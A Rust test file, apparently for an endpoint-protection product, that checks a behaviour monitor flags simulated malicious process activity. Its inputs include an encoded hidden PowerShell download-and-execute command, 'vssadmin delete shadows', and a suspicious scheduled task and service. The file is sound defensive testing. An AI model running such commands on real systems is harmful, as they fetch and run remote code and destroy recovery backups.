use samulibre_shield::behavior_monitor::BehaviorMonitor;
use samulibre_shield::web_shield::WebShieldEngine;
use std::fs;

#[test]
fn qa_behavior_monitor_and_web_shield() {
    let monitor = BehaviorMonitor::new();
    println!("[QA][BehaviorMonitor] intel_rules_loaded={}", monitor.intel_rules_count());

    // 1. Simulación PowerShell ofuscado + descarga en memoria
    let alert_ps = monitor.evaluate_process_with_context(
        4101,
        "powershell.exe",
        Some(4100),
        Some("winword.exe"),
        "powershell.exe -NoP -W hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwBwACcAKQ== ; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.invalid/p')",
    );
    assert!(alert_ps.is_some(), "Debe detectar PowerShell ofuscado lanzado por winword.exe");
    println!(
        "[QA][BehaviorMonitor] PS alert: technique={} severity={:?}",
        alert_ps.as_ref().unwrap().technique_id,
        alert_ps.as_ref().unwrap().severity
    );

    // 2. Simulación VSS Wiper (ransomware)
    let alert_vss = monitor.evaluate_process_with_context(
        4102,
        "vssadmin.exe",
        Some(4101),
        Some("powershell.exe"),
        "vssadmin.exe delete shadows /all /quiet",
    );
    assert!(alert_vss.is_some(), "Debe detectar vssadmin delete shadows");
    println!(
        "[QA][BehaviorMonitor] VSS alert: technique={} severity={:?}",
        alert_vss.as_ref().unwrap().technique_id,
        alert_vss.as_ref().unwrap().severity
    );

    // 3. Comando legítimo de desarrollo/sistema (no debe generar FP)
    let alert_clean = monitor.evaluate_process_with_context(
        4103,
        "cargo.exe",
        Some(1000),
        Some("code.exe"),
        "cargo.exe test --workspace",
    );
    assert!(alert_clean.is_none(), "No debe alertar en comandos legítimos de desarrollo");

    // 4. Simulación Tarea Programada sospechosa (T1053.005) y Servicio anómalo (T1543.003)
    let alert_task = monitor.evaluate_scheduled_task_or_service_event(
        4104,
        "schtasks.exe",
        false,
        "UpdaterTask",
        r"powershell.exe -NoP -W hidden -File C:\Users\Public\update.ps1",
    );
    assert_eq!(alert_task.unwrap().technique_id, "T1053.005");

    let alert_svc = monitor.evaluate_scheduled_task_or_service_event(
        4105,
        "sc.exe",
        true,
        "FakeSvc",
        r"C:\Users\saghe\AppData\Local\Temp\evil_svc.exe",
    );
    assert_eq!(alert_svc.unwrap().technique_id, "T1543.003");

    // 4. WebShieldEngine initialization
    let tmp = std::env::temp_dir().join("samulibre_qa_webshield");
    let _ = fs::create_dir_all(&tmp);
    let _shield = WebShieldEngine::new(&tmp);
    let _ = fs::remove_dir_all(&tmp);
}
